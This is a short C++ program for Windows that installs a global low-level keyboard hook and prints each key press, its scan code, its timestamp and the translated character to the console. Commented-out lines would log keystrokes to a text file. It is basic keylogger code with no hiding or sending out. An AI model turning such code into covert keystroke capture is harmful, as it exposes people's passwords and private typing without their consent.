#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>
#include <sstream>
#include <wchar.h>
#include <cstdlib>

std::ofstream fileStream;
HHOOK hKeyboardHook;
// Keyboard hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKeyboardHookStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        if (wParam == WM_KEYDOWN) {
            std::cout << "Key pressed vkCode: " << pKeyboardHookStruct->vkCode << std::endl;
            std::cout << "Key pressed scanCode: " << pKeyboardHookStruct->scanCode << std::endl;
            std::cout << "Key pressed time: " << pKeyboardHookStruct->time << std::endl;
        }
        // else if (wParam == WM_KEYUP) {
        //     std::cout << "Key released: " << pKeyboardHookStruct->vkCode << std::endl;
        // }
        int vkCode = pKeyboardHookStruct->vkCode;
        int scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
        HKL keyboardLayout = GetKeyboardLayout(0);
        BYTE keyState[256];
        GetKeyboardState(keyState);
        WCHAR buffer[2];
        int result = ToUnicodeEx(vkCode, scanCode, keyState, buffer, 2, 0, keyboardLayout);
        std::cout << buffer[0] << std::endl;
        char znak =vkCode;
        std::cout << znak << std::endl;
        // int lol= pKeyboardHookStruct->vkCode;
        // wchar_t unicode_char = static_cast<wchar_t>(lol);
        // std::wcout << lol << unicode_char << std::endl;
        // fileStream.open("myfile.txt", std::ios::app);
        // fileStream << pKeyboardHookStruct->vkCode << std::endl;
        // fileStream.close();
    }
    // Call the next hook procedure in the chain
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void cleanup() {
    UnhookWindowsHookEx(hKeyboardHook);
}
int main() {
    // Install the keyboard hook
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hKeyboardHook == NULL) {
        std::cerr << "Failed to install keyboard hook" << std::endl;
        return 1;
    }
    std::atexit(cleanup);

    // Run the message loop to process events
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    // Uninstall the keyboard hook
    UnhookWindowsHookEx(hKeyboardHook);
    return 0;
}